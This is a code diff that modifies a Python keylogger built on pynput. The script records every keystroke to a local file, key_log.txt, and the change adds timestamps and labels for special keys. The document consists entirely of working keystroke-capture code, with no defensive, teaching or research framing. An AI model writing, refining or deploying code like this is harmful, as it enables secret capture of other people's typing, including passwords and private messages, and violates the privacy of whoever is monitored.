@@ -1,29 +1,28 @@
 from pynput import keyboard
+from datetime import datetime
 
 log_file = "key_log.txt"
 
 def on_press(key):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
         with open(log_file, "a") as f:
-            f.write(key.char)
+            f.write(f"[{timestamp}] {key.char}\n")
     except AttributeError:
-        # Handle special keys (space, enter, etc.)
         if key == keyboard.Key.space:
             with open(log_file, "a") as f:
-                f.write(" ")
+                f.write(f"[{timestamp}] [SPACE]\n")
         elif key == keyboard.Key.enter:
             with open(log_file, "a") as f:
-                f.write("\n")
+                f.write(f"[{timestamp}] [ENTER]\n")
         else:
             with open(log_file, "a") as f:
-                f.write(f" [{key.name}] ")
+                f.write(f"[{timestamp}] [{key.name.upper()}]\n")
 
 def on_release(key):
-    # Stop listener by pressing ESC
     if key == keyboard.Key.esc:
         return False
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    print("Keylogger started... Press ESC to stop.")
+    print("⏺️ Keylogger started with timestamps... Press ESC to stop.")
     listener.join()
-
